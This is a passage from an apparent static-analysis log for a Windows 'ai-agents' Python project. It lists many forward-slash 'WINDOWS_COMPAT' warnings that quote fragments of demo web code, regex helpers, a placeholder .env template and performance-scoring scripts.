        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 575: Forward slash in path - ');\n            }\n        }\n        \n        async function executeDemo() {\n            try {\n                const response = await fetch(`/api/demo/${sessionId}/execute`, {\n                    method: '",
        "timestamp": "2025-09-05T17:30:42.183312"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 603: Forward slash in path - \">ACT ${actNumber}</div>\n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183351"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 604: Forward slash in path - \">${actName}</div>\n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183378"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 605: Forward slash in path - \"></div>\n                <div style=\"",
        "timestamp": "2025-09-05T17:30:42.183405"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 606: Forward slash in path - \">\n                    Autonomous Intelligence in Action...\n                </div>\n            `;\n        }\n        \n        function showDemoResults(results) {\n            const satisfaction = results.audience_satisfaction || 9.5;\n            const technical = results.technical_achievement || 9.2;\n            const business = results.business_impact || 9.8;\n            const visual = results.visual_spectacle || 9.7;\n            \n            document.getElementById('",
        "timestamp": "2025-09-05T17:30:42.183439"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 619: Forward slash in path - \">SYMPHONY COMPLETE!</div>\n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183468"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 620: Forward slash in path - \">Autonomous Intelligence Achieved</div>\n                \n                <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183497"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 624: Forward slash in path - \">${satisfaction.toFixed(1)}/10</div>\n                        <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183526"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 625: Forward slash in path - \">Audience Satisfaction</div>\n                    </div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183555"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 628: Forward slash in path - \">${technical.toFixed(1)}/10</div>\n                        <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183585"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 629: Forward slash in path - \">Technical Achievement</div>\n                    </div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183614"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 632: Forward slash in path - \">${business.toFixed(1)}/10</div>\n                        <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183644"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 633: Forward slash in path - \">Business Impact</div>\n                    </div>\n                    <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183673"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 636: Forward slash in path - \">${visual.toFixed(1)}/10</div>\n                        <div class=\"",
        "timestamp": "2025-09-05T17:30:42.183704"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 637: Forward slash in path - \">Visual Spectacle</div>\n                    </div>\n                </div>\n                \n                <div style=\"",
        "timestamp": "2025-09-05T17:30:42.183734"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 641: Forward slash in path - \">\n                    🎆 The Future is Autonomous! 🎆\n                </div>\n            `;\n        }\n        \n        // Auto-hide loading screen and start when ready\n        setTimeout(() => {\n            document.querySelector('",
        "timestamp": "2025-09-05T17:30:42.183771"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\web_interface.py",
        "warning": "Line 649: Forward slash in path - ';\n        }, 1000);\n    </script>\n</body>\n</html>\n        '",
        "timestamp": "2025-09-05T17:30:42.183799"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\debug_regex.py",
        "warning": "Line 6: Forward slash in path - \"\nACME CORPORATION\n123 Business Street\nNew York, NY 10001\n\nINVOICE\n\nInvoice Number: INV-2024-001\nInvoice Date: 01/15/2024\n\nBill To:\nXYZ Company\n456 Client Avenue\n\nDescription                 Total\nProfessional Services     $1,500.00\nConsulting Hours          $1,000.00\n\nTotal Amount:             $2,500.00\n\"",
        "timestamp": "2025-09-05T17:30:42.184683"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\debug_regex.py",
        "warning": "Line 45: Forward slash in path - '(?:invoice\\s*)?date\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.184700"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\debug_regex.py",
        "warning": "Line 46: Forward slash in path - '(?:invoice\\s*)?date\\s*:?\\s*(\\d{2,4}[-/]\\d{1,2}[-/]\\d{1,2})'",
        "timestamp": "2025-09-05T17:30:42.184704"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\debug_regex.py",
        "warning": "Line 47: Forward slash in path - '(\\d{1,2}/\\d{1,2}/\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.184709"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\debug_regex.py",
        "warning": "Line 78: Forward slash in path - '^[0-9/\\-\\s]+$'",
        "timestamp": "2025-09-05T17:30:42.184729"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 50: Forward slash in path - \"demo/launch_ultimate_demo.py\"",
        "timestamp": "2025-09-05T17:30:42.185265"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 103: Forward slash in path - \"# AI Agents Platform Configuration Template\n# Copy to .env and customize for your environment\n\n# API Keys (required)\nANTHROPIC_API_KEY=your-anthropic-api-key-here\nOPENAI_API_KEY=your-openai-api-key-here\n\n# Optional API Keys\nLANGCHAIN_API_KEY=your-langchain-key-here\nAZURE_OPENAI_API_KEY=your-azure-key-here\nAZURE_OPENAI_ENDPOINT=your-azure-endpoint-here\n\n# Development Configuration\nDEBUG=true\nLOG_LEVEL=info\nENVIRONMENT=development\nNODE_ENV=development\n\n# Database Configuration\n# For development (SQLite)\nDATABASE_DATABASE_URL=sqlite+aiosqlite:///ai_agents_dev.db\n\n# For production (PostgreSQL)\n# DATABASE_DATABASE_URL=postgresql+asyncpg://user:password@localhost:5432/ai_agents_prod\n\n# Skip configuration validation during development\nSKIP_CONFIG_VALIDATION=true\n\n# Monitoring and Logging\nMONITORING_ENABLED=true\nLOG_FILE_PATH=logs/ai_agents.log\n\n# Security Settings (change in production)\nSECRET_KEY=development-secret-key-change-in-production\nJWT_SECRET_KEY=development-jwt-secret-change-in-production\n\n# API Configuration\nAPI_HOST=localhost\nAPI_PORT=8000\nDASHBOARD_PORT=8501\n\n# Processing Configuration\nMAX_CONCURRENT_PROCESSES=4\nDEFAULT_CONFIDENCE_THRESHOLD=0.95\nMAX_COST_PER_DOCUMENT=0.05\n\n# Integration Settings (optional)\nQUICKBOOKS_CLIENT_ID=\nQUICKBOOKS_CLIENT_SECRET=\nSAP_CLIENT_ID=\nSAP_CLIENT_SECRET=\n\"",
        "timestamp": "2025-09-05T17:30:42.185315"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 189: Forward slash in path - \"#!/usr/bin/env python3\n'",
        "timestamp": "2025-09-05T17:30:42.185342"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 266: Forward slash in path - \"data/uploads\"",
        "timestamp": "2025-09-05T17:30:42.185385"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 266: Forward slash in path - \"data/processing\"",
        "timestamp": "2025-09-05T17:30:42.185394"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 266: Forward slash in path - \"data/archive\"",
        "timestamp": "2025-09-05T17:30:42.185404"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 293: Forward slash in path - \"   Import test: {passed_imports}/{len(import_tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.185426"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 299: Forward slash in path - \"demo/launch_ultimate_demo.py\"",
        "timestamp": "2025-09-05T17:30:42.185437"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 300: Forward slash in path - \"dashboard/main_dashboard.py\"",
        "timestamp": "2025-09-05T17:30:42.185447"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 311: Forward slash in path - \"   File test: {existing_files}/{len(critical_files)} found\"",
        "timestamp": "2025-09-05T17:30:42.185461"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\fix_integration_issues.py",
        "warning": "Line 365: Forward slash in path - \"   2. python demo/launch_ultimate_demo.py  # Test demo system\"",
        "timestamp": "2025-09-05T17:30:42.185492"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Line 111: Forward slash in path - \"Use asyncio.sleep() and async/await patterns\"",
        "timestamp": "2025-09-05T17:30:42.186086"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Line 249: Forward slash in path - \"# Convert to async/await pattern\"",
        "timestamp": "2025-09-05T17:30:42.186173"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Line 378: Forward slash in path - \"\n        if not self.optimizations:\n            return 0.0\n        \n        # Use diminishing returns model\n        improvements = [opt.estimated_improvement for opt in self.optimizations]\n        improvements.sort(reverse=True)\n        \n        total = 0\n        for i, improvement in enumerate(improvements):\n            # Apply diminishing returns: each additional optimization is less effective\n            diminishing_factor = 1.0 / (1.0 + i * 0.1)\n            total += improvement * diminishing_factor\n        \n        # Cap at reasonable maximum\n        return min(total, 50.0)  # Max 50% improvement estimate\n    \n    def _generate_recommendations(self) -> List[str]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.186263"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Line 401: Forward slash in path - \"3. Implement async/await patterns where applicable\"",
        "timestamp": "2025-09-05T17:30:42.186279"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_optimizer.py",
        "warning": "Line 416: Forward slash in path - \"12. Design for async/concurrent execution\"",
        "timestamp": "2025-09-05T17:30:42.186300"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_test.py",
        "warning": "Line 29: Forward slash in path - \": round(psutil.virtual_memory().total / (1024**3), 2),\n            \"",
        "timestamp": "2025-09-05T17:30:42.186708"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_test.py",
        "warning": "Line 30: Forward slash in path - \": round(psutil.virtual_memory().available / (1024**3), 2),\n            \"",
        "timestamp": "2025-09-05T17:30:42.186719"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_test.py",
        "warning": "Line 227: Forward slash in path - \"Use async operations for I/O-bound tasks\"",
        "timestamp": "2025-09-05T17:30:42.186826"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\performance_test.py",
        "warning": "Line 325: Forward slash in path - \", 0)\n            if single_thread > 0 and multi_thread > 0:\n                speedup = single_thread / multi_thread\n                print(f\"",
        "timestamp": "2025-09-05T17:30:42.186885"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 94: Forward slash in path - \"] / test_summary[\"",
        "timestamp": "2025-09-05T17:30:42.187379"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 181: Forward slash in path - \"Temporal system tests: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187446"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 235: Forward slash in path - \"Memory system tests: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187484"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 288: Forward slash in path - \"Learning system tests: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187524"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 338: Forward slash in path - \": passed_validations / max(total_validations, 1),\n                \"",
        "timestamp": "2025-09-05T17:30:42.187565"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 340: Forward slash in path - \"Behavior validation: {passed_validations}/{total_validations} passed\"",
        "timestamp": "2025-09-05T17:30:42.187578"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 382: Forward slash in path - \"Dashboard system tests: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187614"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 447: Forward slash in path - \"Component integration tests: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187672"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 496: Forward slash in path - \"Performance benchmarks: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187735"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "warning": "Line 555: Forward slash in path - \"End-to-end workflows: {sum(tests.values())}/{len(tests)} passed\"",
        "timestamp": "2025-09-05T17:30:42.187803"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 2: Forward slash in path - \"\nPhase 7 Performance Optimization Runner\n\nCOMPREHENSIVE PERFORMANCE OPTIMIZATION MISSION:\n- Transform performance from 50.0/100 (Grade: F) to 90+/100 (Grade: A)\n- Address 1,253 performance issues identified in system\n- Implement caching, async optimization, algorithm improvements\n- Achieve sub-second response times and optimal resource usage\n\nUsage:\n    python run_performance_optimization.py [--profile] [--report] [--monitor]\n\"",
        "timestamp": "2025-09-05T17:30:42.188296"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 63: Forward slash in path - \"TARGET: Transform performance from 50.0/100 (F) to 90+/100 (A)\"",
        "timestamp": "2025-09-05T17:30:42.188339"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 83: Forward slash in path - \"📊 BASELINE PERFORMANCE SCORE: {baseline_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.188371"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 95: Forward slash in path - \"📈 FINAL PERFORMANCE SCORE: {final_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.188393"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 103: Forward slash in path - \"⚠️  Performance target not fully achieved. Current: {final_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.188413"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 188: Forward slash in path - \"{(score_improvement / max(1, optimization_result.performance_score_before)) * 100:.1f}%\"",
        "timestamp": "2025-09-05T17:30:42.188498"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 262: Forward slash in path - \"💰 Evaluate hardware/infrastructure upgrades\"",
        "timestamp": "2025-09-05T17:30:42.188586"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 295: Forward slash in path - \"📈 Current Performance Score: {current_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.188634"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 299: Forward slash in path - \"⚠️  Performance degradation detected: {current_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.188658"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 360: Forward slash in path - \"📊 Performance Score: {before_score:.1f}/100 ({before_grade}) → {after_score:.1f}/100 ({after_grade})\"",
        "timestamp": "2025-09-05T17:30:42.188732"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_performance_optimization.py",
        "warning": "Line 390: Forward slash in path - \"🎯 TARGET: Transform 50.0/100 (Grade F) → 90+/100 (Grade A)\"",
        "timestamp": "2025-09-05T17:30:42.188778"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 24: Forward slash in path - \"\n    \n    def __init__(self, project_root: Optional[Path] = None):\n        self.project_root = project_root or Path(__file__).parent.parent\n        self.backend_dir = self.project_root / \"",
        "timestamp": "2025-09-05T17:30:42.189183"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 28: Forward slash in path - \"\n        self.visualization_dir = self.project_root / \"",
        "timestamp": "2025-09-05T17:30:42.189191"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 29: Forward slash in path - \"\n        self.data_dir = self.project_root / \"",
        "timestamp": "2025-09-05T17:30:42.189196"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 38: Forward slash in path - \"ws://localhost:8000/ws\"",
        "timestamp": "2025-09-05T17:30:42.189210"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 91: Forward slash in path - \"\n        requirements_file = self.backend_dir / \"",
        "timestamp": "2025-09-05T17:30:42.189245"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 107: Forward slash in path - \"\n        node_modules = self.visualization_dir / \"",
        "timestamp": "2025-09-05T17:30:42.189263"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 108: Forward slash in path - \"\n        return node_modules.exists() and (node_modules / \"",
        "timestamp": "2025-09-05T17:30:42.189270"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 122: Forward slash in path - \")\n        \n        data_generator = self.data_dir / \"",
        "timestamp": "2025-09-05T17:30:42.189287"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 140: Forward slash in path - \")\n        \n        server_script = self.backend_dir / \"",
        "timestamp": "2025-09-05T17:30:42.189305"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 171: Forward slash in path - \"{self.backend_url}/health\"",
        "timestamp": "2025-09-05T17:30:42.189329"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 261: Forward slash in path - \"{self.backend_url}/health\"",
        "timestamp": "2025-09-05T17:30:42.189411"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\start_visualization_demo.py",
        "warning": "Line 269: Forward slash in path - \"] = response.status_code == 200\n        except:\n            pass\n        \n        # Check if synthetic data exists\n        generated_dir = self.data_dir / \"",
        "timestamp": "2025-09-05T17:30:42.189437"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 218: Forward slash in path - \"\n        \n        # Check for circular dependencies\n        self._check_circular_dependencies()\n        \n        # Check for god classes/components\n        self._check_god_components()\n        \n        # Check coupling and cohesion\n        self._check_coupling()\n        \n        # Check for missing abstractions\n        self._check_missing_abstractions()\n        \n        # Check for proper layering\n        self._check_layering()\n    \n    def _check_circular_dependencies(self) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.189913"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 289: Forward slash in path - \"Check for god classes/components (overly complex components)\"",
        "timestamp": "2025-09-05T17:30:42.189952"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 313: Forward slash in path - \"\n        \n        # Calculate coupling metrics\n        coupling_counts = defaultdict(int)\n        \n        for dep in self.dependencies:\n            coupling_counts[dep.source_component] += 1\n        \n        # Identify tightly coupled components\n        avg_coupling = sum(coupling_counts.values()) / len(coupling_counts) if coupling_counts else 0\n        \n        for component, coupling_count in coupling_counts.items():\n            if coupling_count > avg_coupling * 2:  # More than 2x average coupling\n                issue = ArchitectureIssue(\n                    issue_type=\"",
        "timestamp": "2025-09-05T17:30:42.189992"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 415: Forward slash in path - ', [])}\n        \n        # Check for mixed async/sync patterns that might cause issues\n        for dep in self.dependencies:\n            source_async = dep.source_component in async_components\n            target_async = dep.target_component in async_components\n            \n            if source_async and not target_async and dep.dependency_type == '",
        "timestamp": "2025-09-05T17:30:42.190096"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 436: Forward slash in path - \"\n        \n        # Calculate architecture scores\n        modularity_score = self._calculate_modularity_score()\n        coupling_score = self._calculate_coupling_score()\n        cohesion_score = self._calculate_cohesion_score()\n        \n        # Overall architecture score\n        architecture_score = (modularity_score + coupling_score + cohesion_score) / 3\n        \n        # Penalty for critical issues\n        critical_issues = len([issue for issue in self.issues if issue.severity == '",
        "timestamp": "2025-09-05T17:30:42.190129"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 493: Forward slash in path - '] <= 500])\n        size_ratio = reasonable_size_count / len(self.components)\n        score += size_ratio * 20\n        \n        return max(0, min(100, score))\n    \n    def _calculate_coupling_score(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.190183"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 500: Forward slash in path - \"\n        if not self.dependencies:\n            return 100\n        \n        # Calculate average coupling\n        coupling_counts = defaultdict(int)\n        for dep in self.dependencies:\n            coupling_counts[dep.source_component] += 1\n        \n        avg_coupling = sum(coupling_counts.values()) / len(coupling_counts)\n        \n        # Score based on coupling (lower coupling = higher score)\n        if avg_coupling <= 3:\n            score = 90\n        elif avg_coupling <= 5:\n            score = 75\n        elif avg_coupling <= 8:\n            score = 60\n        elif avg_coupling <= 12:\n            score = 40\n        else:\n            score = 20\n        \n        # Penalty for circular dependencies\n        circular_deps = [issue for issue in self.issues if issue.issue_type == '",
        "timestamp": "2025-09-05T17:30:42.190220"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
